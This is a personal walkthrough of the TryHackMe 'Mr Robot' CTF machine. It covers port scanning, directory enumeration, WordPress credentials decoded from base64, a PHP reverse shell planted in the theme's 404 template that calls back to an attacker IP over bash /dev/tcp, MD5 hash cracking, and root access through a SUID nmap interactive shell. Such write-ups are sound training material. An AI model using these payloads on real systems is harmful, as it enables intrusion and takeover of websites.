---
title: Mr Robot CTF
date: '2024-12-30'
category: tryhackme
tags: tryhackme, ctf
description: Detailed technical walkthrough and security analysis for the Mr Robot
  CTF machine on TryHackMe.
slug: mr-robot-ctf
---





> nmap

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2b:c5:7f:9c:92:4a:bf:d2:8e:d9:fe:c3:d7:aa:2f:35 (RSA)
|   256 e6:07:57:c7:0b:34:2d:9b:23:fa:7b:5c:c5:08:c8:87 (ECDSA)
|_  256 fe:e2:34:3a:2b:c6:0e:a3:fd:d8:46:9d:ce:1f:50:a2 (ED25519)
80/tcp  open  http     Apache httpd
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.201.70.144
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.201.70.144:80/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: http://10.201.70.144/
|     
|     Path: http://10.201.70.144:80/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: http://10.201.70.144/
|     
|     Path: http://10.201.70.144:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://10.201.70.144/
|     
|     Path: http://10.201.70.144:80/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: http://10.201.70.144/
|     
|     Path: http://10.201.70.144:80/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."+"forcedLinkTrackingTimeout)s.forcedLinkTrackingTimeout=250;setTimeout('if(window.s_c_il)window.s_c_il['+s._in+'].bcr()',s.forcedLinkTrackingTimeout);}else
|     Form id: 
|     Form action: http://10.201.70.144/
|     
|     Path: http://10.201.70.144:80/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."+"forcedLinkTrackingTimeout)s.forcedLinkTrackingTimeout=250;setTimeout('if(window.s_c_il)window.s_c_il['+s._in+'].bcr()',s.forcedLinkTrackingTimeout);}else
|     Form id: 
|     Form action: http://10.201.70.144/
|     
|     Path: http://10.201.70.144:80/js/BASE_URL1%22/live/%221;this.firstBoot?(this.firstBoot=!1,this.track.omni("Email
|     Form id: 
|     Form action: http://10.201.70.144/
|     
|     Path: http://10.201.70.144:80/js/BASE_URL1%22/live/%221;this.firstBoot?(this.firstBoot=!1,this.track.omni("Email
|     Form id: 
|     Form action: http://10.201.70.144/
|     
|     Path: http://10.201.70.144:80/wp-login.php
|     Form id: loginform
|_    Form action: http://10.201.70.144/wp-login.php
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
443/tcp open  ssl/http Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
|_http-server-header: Apache
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.201.70.144
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.201.70.144:443/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: https://10.201.70.144:443/
|     
|     Path: http://10.201.70.144:443/js/vendor/null1this.tags.length10%7D1t.get1function11%7Bif1011this.tags.length1return
|     Form id: 
|     Form action: https://10.201.70.144:443/
|     
|     Path: http://10.201.70.144:443/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: https://10.201.70.144:443/
|     
|     Path: http://10.201.70.144:443/js/u;c.appendChild(o);'+(n?'o.c=0;o.i=setTimeout(f2,100)':'')+'}}catch(e){o=0}return
|     Form id: 
|     Form action: https://10.201.70.144:443/
|     
|     Path: http://10.201.70.144:443/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|     Form action: https://10.201.70.144:443/
|     
|     Path: http://10.201.70.144:443/js/rs;if(s.useForcedLinkTracking||s.bcf){if(!s."
|     Form id: 
|_    Form action: https://10.201.70.144:443/
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|   /readme.html: Interesting, a readme.
|   /0/: Potentially interesting folder
|_  /image/: Potentially interesting folder
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.15 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5
Aggressive OS guesses: Linux 4.15 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.4 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> gobuster

```
❯ gobuster dir -u https://10.201.70.144 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,asp,aspx,txt -t 50 -s "200,204,301,302,307,401,403" -e -k \
  --status-codes-blacklist "" -o gobuster_results.txt


/atomatom                 (Status: 301) [Size: 0] [--> https://10.201.70.144/feed/atom/]
/imageimage                (Status: 301) [Size: 0] [--> https://10.201.70.144/image/]
/wp-contentwp-content           (Status: 301) [Size: 241] [--> https://10.201.70.144/wp-content/]
/adminadmin                (Status: 301) [Size: 236] [--> https://10.201.70.144/admin/]
/audioaudio                (Status: 301) [Size: 236] [--> https://10.201.70.144/audio/]
/wp-loginwp-login             (Status: 200) [Size: 2619]
/wp-login.phpwp-login.php         (Status: 200) [Size: 2619]
/csscss                  (Status: 301) [Size: 234] [--> https://10.201.70.144/css/]
/rss2rss2                 (Status: 301) [Size: 0] [--> https://10.201.70.144/feed/]
/licenselicense              (Status: 200) [Size: 309]
/license.txtlicense.txt          (Status: 200) [Size: 309]
/wp-includeswp-includes          (Status: 301) [Size: 242] [--> https://10.201.70.144/wp-includes/]
/jsjs                   (Status: 301) [Size: 233] [--> https://10.201.70.144/js/]
/wp-register.phpwp-register.php      (Status: 301) [Size: 0] [--> https://10.201.70.144/wp-login.php?action=register]
/ImageImage                (Status: 301) [Size: 0] [--> https://10.201.70.144/Image/]
/wp-rss2.phpwp-rss2.php          (Status: 301) [Size: 0] [--> https://10.201.70.144/feed/]
/page1page1                (Status: 301) [Size: 0] [--> https://10.201.70.144/]
/readme.htmlreadme.html          (Status: 200) [Size: 64]
/readmereadme               (Status: 200) [Size: 64]
/robotsrobots               (Status: 200) [Size: 41]
/robots.txtrobots.txt           (Status: 200) [Size: 41]
/dashboarddashboard            (Status: 302) [Size: 0] [--> https://10.201.70.144/wp-admin/]
/wp-adminwp-admin             (Status: 301) [Size: 239] [--> https://10.201.70.144/wp-admin/]

```

> So I investigate first

```
http://10.201.70.144/robots.txt

```

> and find

```
User-agent: *
fsocity.dic
key-1-of-3.txt

```

> and I open those two urls

```
http://10.201.70.144/fsocity.dic
http://10.201.70.144/key-1-of-3.txt

```

> and I found first flag key and second url has bunch of username or passwords,


> I stay too much time on different tools to find login info finally i found that on `\license` web url has hash text after finding decode that using cyberchef ,

```
ZWxsaW90OkVSMjgtMDY1Mgo=

after encode `base64` i got 

		```
		> elliot:ER28-0652
		```
```

> So i got username and pwd

> and login and  change theme ` Twenty Fifteen: 404 Template (404.php)` to adding reverse shell and save it and get shell

```
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.21.16.42/4444 0>&1'");

```

> after load that like this `wp-includes/themes/TwentyFifteen/404.php` and got shell

```
daemon@ip-10-201-70-144:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
daemon@ip-10-201-70-144:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
daemon@ip-10-201-70-144:/home/robot$ cp key-2-of-3.txt /tmp
cp key-2-of-3.txt /tmp
cp: cannot open 'key-2-of-3.txt' for reading: Permission denied

```

> so I crack this hash in crackstation web and i got `abcdefghijklmnopqrstuvwxyz` so i use this to login as robot and unlock 2key,

```
daemon@ip-10-201-70-144:/home$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

$ ls -la
ls -la
total 16
drwxr-xr-x  4 root   root   4096 Jun  2 18:14 .
drwxr-xr-x 23 root   root   4096 Oct 10 16:33 ..
drwxr-xr-x  2 root   root   4096 Nov 13  2015 robot
drwxr-xr-x  4 ubuntu ubuntu 4096 Jun  2 18:16 ubuntu
$ cd robot
cd robot
$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 4 root  root  4096 Jun  2 18:14 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
$ cat key-2-of-3.txt
cat key-2-of-3.txt
...........................
```

> to find 3key first i use this

```
find / -perm -4000 2>/dev/null

```

> and I got

```
daemon@ip-10-201-70-144:/tmp$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

> So I try to use that `bin/nmap`  so after researching I found something on `[gftobins](https://gtfobins.github.io/gtfobins/)` website,

> So it works

```
nmap --interactive
nmap> !sh

```

```
nmap --interactive
nmap> !shnmap --interactive
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh

root@ip-10-201-70-144:/root# cat key-3-of-3.txt
cat key-3-of-3.txt

```